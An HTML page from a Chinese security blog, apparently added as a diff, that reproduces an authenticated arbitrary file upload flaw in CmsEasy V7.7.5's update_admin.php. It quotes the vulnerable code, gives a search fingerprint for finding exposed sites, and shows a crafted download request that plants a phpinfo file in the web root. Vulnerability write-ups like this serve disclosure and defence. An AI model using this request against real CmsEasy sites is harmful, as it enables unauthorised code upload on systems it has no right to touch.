@@ -1,0 +1,778 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CmsEasy update_admin.php 后台任意文件上传漏洞漏洞描述CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件 影响版本CmsEasy V7.7.5_20210919 网络测绘body&#x3D;”cmseasyedit”  环境搭建       漏洞复现主页面  存在漏洞的文件为 lib&#x2F;admin&#x2F;update_ad">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CmsEasy update_admin.php 后台任意文件上传漏洞">
+<meta property="og:url" content="http://example.com/2024/06/14/%E6%BC%8F%E6%B4%9E%E5%BA%93/CMS%E6%BC%8F%E6%B4%9E/CmsEasy/CmsEasy%20update_admin.php%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="云浮安全实验室">
+<meta property="og:description" content="CmsEasy update_admin.php 后台任意文件上传漏洞漏洞描述CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件 影响版本CmsEasy V7.7.5_20210919 网络测绘body&#x3D;”cmseasyedit”  环境搭建       漏洞复现主页面  存在漏洞的文件为 lib&#x2F;admin&#x2F;update_ad">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632722654239-33f8ba2f-dfd8-48b9-bf8f-a93f1d2b2cba-20220313234956895.png">
+<meta property="og:image" content="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632722813176-a2c6d9c2-e5f5-483a-8448-775a9ce41d4a-20220313234958829.png">
+<meta property="og:image" content="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632745397516-acc4d6fe-182d-4a3a-87f3-8d9b8299e81d.png">
+<meta property="og:image" content="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632746012776-5f9a2330-5289-4b8c-81c7-6f0a3a452979.png">
+<meta property="og:image" content="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632746461754-efd8a8a5-d455-4ccd-b194-a8716a206640.png">
+<meta property="og:image" content="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632746383961-7f2d63fc-2480-4604-8646-446503f857c6.png">
+<meta property="og:image" content="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632746435271-559c0cc2-38a7-4a8d-a24a-b6fd48180482.png">
+<meta property="article:published_time" content="2024-06-14T15:33:29.000Z">
+<meta property="article:modified_time" content="2024-06-14T15:33:29.418Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CmsEasy">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632722654239-33f8ba2f-dfd8-48b9-bf8f-a93f1d2b2cba-20220313234956895.png">
+  
+  
+  
+  <title>CmsEasy update_admin.php 后台任意文件上传漏洞 - 云浮安全实验室</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"j97WaZWDr63JePKi2EnNaOv2-gzGzoHsz","app_key":"rhTwo9mnTa5DN7s6Tj96dU9z","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>云浮安全实验室</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CmsEasy update_admin.php 后台任意文件上传漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-14 23:33" pubdate>
+          2024年6月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          465 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          4 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span>次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CmsEasy update_admin.php 后台任意文件上传漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CmsEasy-update-admin-php-后台任意文件上传漏洞"><a href="#CmsEasy-update-admin-php-后台任意文件上传漏洞" class="headerlink" title="CmsEasy update_admin.php 后台任意文件上传漏洞"></a>CmsEasy update_admin.php 后台任意文件上传漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>CmsEasy V7.7.5_20210919</p>
+<h2 id="网络测绘"><a href="#网络测绘" class="headerlink" title="网络测绘"></a>网络测绘</h2><p>body&#x3D;”cmseasyedit” </p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><a-alert type="success" message="https://www.cmseasy.cn/chm/faq/show-645.html" description="" showIcon>
+</a-alert>
+<br/>
+
+
+
+<p><img src="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632722654239-33f8ba2f-dfd8-48b9-bf8f-a93f1d2b2cba-20220313234956895.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>主页面</p>
+<p><img src="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632722813176-a2c6d9c2-e5f5-483a-8448-775a9ce41d4a-20220313234958829.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>存在漏洞的文件为 <code>lib/admin/update_admin.php</code></p>
+<p><img src="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632745397516-acc4d6fe-182d-4a3a-87f3-8d9b8299e81d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>其中需要注意的代码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">downfile_action</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$url</span> = front::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br>        <span class="hljs-variable">$url</span>=service::<span class="hljs-title function_ invoke__">getInstance</span>()-&gt;<span class="hljs-title function_ invoke__">unlockString</span>(<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;cmseasy_url&quot;</span>);<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_file</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;cache&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;err&#x27;</span> =&gt; <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang_admin</span>(<span class="hljs-string">&#x27;update_package_download_failed&#x27;</span>),<br>            );<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;upgrade/config_cn.php&#x27;</span>);<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;upgrade/config_cn.tmp.php&#x27;</span>);<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;upgrade/upgrade.sql&#x27;</span>);<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;upgrade/command.php&#x27;</span>);<br>            front::<span class="hljs-title function_ invoke__">remove</span>(ROOT.<span class="hljs-string">&#x27;/cache/data&#x27;</span>);<br>            front::<span class="hljs-title function_ invoke__">remove</span>(ROOT.<span class="hljs-string">&#x27;/cache/template&#x27;</span>);<span class="hljs-comment">//清空全部语言</span><br>            <span class="hljs-variable">$langdata</span>=<span class="hljs-title function_ invoke__">getlang</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$langdata</span> != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$langdata</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>                    front::<span class="hljs-title function_ invoke__">remove</span>(ROOT.<span class="hljs-string">&#x27;/cache/&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-string">&#x27;langurlname&#x27;</span>]);<br>                    front::<span class="hljs-title function_ invoke__">remove</span>(ROOT.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-string">&#x27;langurlname&#x27;</span>].<span class="hljs-string">&#x27;/template&#x27;</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">//先清空缓存</span><br>            user::<span class="hljs-title function_ invoke__">deletesession</span>();<br>            category::<span class="hljs-title function_ invoke__">deletesession</span>();<br>            <span class="hljs-comment">//提取分类</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT.<span class="hljs-string">&quot;/lib/table/type.php&quot;</span>)) &#123;<br>                type::<span class="hljs-title function_ invoke__">deletesession</span>();<br>            &#125;<br>            <span class="hljs-comment">//提取专题</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT.<span class="hljs-string">&quot;/lib/table/special.php&quot;</span>)) &#123;<br>                special::<span class="hljs-title function_ invoke__">deletesession</span>();<br>            &#125;<br>            <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PclZip</span>(<span class="hljs-string">&#x27;cache/patch.zip&#x27;</span>);<br>            <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">extract</span>(PCLZIP_OPT_PATH, ROOT, PCLZIP_OPT_REPLACE_NEWER);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;upgrade/upgrade.sql&#x27;</span>)) &#123;<br>                <span class="hljs-variable">$sqlquery</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;upgrade/upgrade.sql&#x27;</span>);<br>                <span class="hljs-variable">$sqlquery</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;`cmseasy_&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span> . config::<span class="hljs-title function_ invoke__">getdatabase</span>(<span class="hljs-string">&#x27;database&#x27;</span>, <span class="hljs-string">&#x27;prefix&#x27;</span>), <span class="hljs-variable">$sqlquery</span>);<br><br>                <span class="hljs-variable">$sqlquery</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$sqlquery</span>);<br>                <span class="hljs-variable">$sqls</span> = <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&quot;/;(--)*[ \t]&#123;0,&#125;\n/&quot;</span>, <span class="hljs-variable">$sqlquery</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">exec_cms_sql</span>(<span class="hljs-variable">$sqls</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;upgrade/command.php&#x27;</span>))&#123;<br>                <span class="hljs-keyword">include</span> ROOT . <span class="hljs-string">&#x27;/upgrade/command.php&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;err&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>                <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable language_">$this</span>-&gt;message,<br>                <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang_admin</span>(<span class="hljs-string">&#x27;upgrade_successful&#x27;</span>),<br>            );<br>        &#125;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$res</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中使用 unlockString 和 get_file 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = front::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-variable">$url</span>=service::<span class="hljs-title function_ invoke__">getInstance</span>()-&gt;<span class="hljs-title function_ invoke__">unlockString</span>(<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;cmseasy_url&quot;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_file</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;cache&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632746012776-5f9a2330-5289-4b8c-81c7-6f0a3a452979.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>写入后在上层目录写入文件，即Web根目录，创建压缩包并上传可访问的服务器上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">zip phpinfo.zip phpinfo.php<br></code></pre></td></tr></table></figure>
+
+<p>构造下载请求</p>
+<p><img src="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632746461754-efd8a8a5-d455-4ccd-b194-a8716a206640.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/index.php?<span class="hljs-keyword">case</span>=update&amp;act=downfile&amp;admin_dir=admin&amp;site=<span class="hljs-keyword">default</span>&amp;url=buTdBnP8%<span class="hljs-number">3</span>DJ%<span class="hljs-number">3</span>DELYuF8Z2IwZyM-awr9fH%<span class="hljs-number">3</span>D0cax6mxICukxw<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632746383961-7f2d63fc-2480-4604-8646-446503f857c6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://xiaoqian8.oss-cn-shanghai.aliyuncs.com/images/1632746435271-559c0cc2-38a7-4a8d-a24a-b6fd48180482.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CMS%E6%BC%8F%E6%B4%9E/" class="category-chain-item">CMS漏洞</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CmsEasy/" class="print-no-link">#CmsEasy</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CmsEasy update_admin.php 后台任意文件上传漏洞</div>
+      <div>http://example.com/2024/06/14/漏洞库/CMS漏洞/CmsEasy/CmsEasy update_admin.php 后台任意文件上传漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/06/14/%E6%BC%8F%E6%B4%9E%E5%BA%93/CMS%E6%BC%8F%E6%B4%9E/CmsEasy/CmsEasy%20language_admin.php%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CmsEasy language_admin.php 后台命令执行漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CmsEasy language_admin.php 后台命令执行漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/14/%E6%BC%8F%E6%B4%9E%E5%BA%93/CMS%E6%BC%8F%E6%B4%9E/CxCMS/CxCMS%20Resource.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="CxCMS Resource.ashx 任意文件读取漏洞">
+                        <span class="hidden-mobile">CxCMS Resource.ashx 任意文件读取漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"j97WaZWDr63JePKi2EnNaOv2-gzGzoHsz","appKey":"rhTwo9mnTa5DN7s6Tj96dU9z","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
